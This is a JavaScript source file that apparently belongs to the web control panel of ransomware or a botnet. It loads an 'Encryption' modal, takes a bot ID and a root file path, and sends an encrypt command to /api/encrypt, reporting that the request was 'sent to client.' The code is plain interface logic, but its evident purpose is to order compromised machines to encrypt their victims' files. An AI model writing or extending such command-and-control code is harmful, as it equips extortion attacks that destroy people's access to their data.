// Dynamically load the "Encryption" modal
async function loadEncryptionModal() {
    const response = await fetch('/static/html/partial.encrypt-modal.html'); // Fetch the modal HTML snippet
    if (response.ok) {
        const modalHtml = await response.text();
        document.getElementById('encrypt-modal-section').innerHTML = modalHtml; // Inject the modal into the DOM

        // Initialize modal-related JavaScript after loading
        initializeEncryptionModal();
    } else {
        showNotification('Failed to load encryption modal', 'error');
    }
}

// Initialize the encryption modal
function initializeEncryptionModal() {
    const modal = document.getElementById('encrypt-modal');
    const openModalButton = document.getElementById('open-encrypt-modal');
    const closeButton = modal.querySelector('.close-button');
    const encryptionForm = document.getElementById('encrypt-form');
    const encryptionRootInput = document.getElementById('encrypt-location-input');

    // Open the modal when the "Encrypt" button is clicked
    openModalButton.addEventListener('click', () => {
        modal.style.display = 'block';
    });

    // Close the modal when the close button is clicked
    closeButton.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    // Close the modal when clicking outside of it
    window.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });

    // Handle the form submission
    encryptionForm.addEventListener('submit', async (event) => {
        event.preventDefault();

        const botId = document.getElementById('client-id').value; // Hidden input for bot ID
        const encryptionRoot = encryptionRootInput.value.trim();

        if (!botId) {
            showNotification('Bot ID is missing.', 'error');
            return;
        }

        if (!encryptionRoot) {
            showNotification('Please enter a root location.', 'error');
            return;
        }

        try {
            const response = await fetch('/api/encrypt', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `bot_id=${encodeURIComponent(botId)}&file_path=${encodeURIComponent(encryptionRoot)}`,
            });

            if (response.ok) {
                const result = await response.json();
                showNotification(`Encryption request successfully sent to client.`, 'success');
            } else {
                const error = await response.json();
                showNotification(`Error: ${error.error}`, 'error');
            }
        } catch (error) {
            console.error('Error requesting encryption:', error);
            showNotification('Failed to send encryption request.', 'error');
        }

        // Close the modal
        modal.style.display = 'none';
    });
}

// Call the function to load the encryption modal
loadEncryptionModal();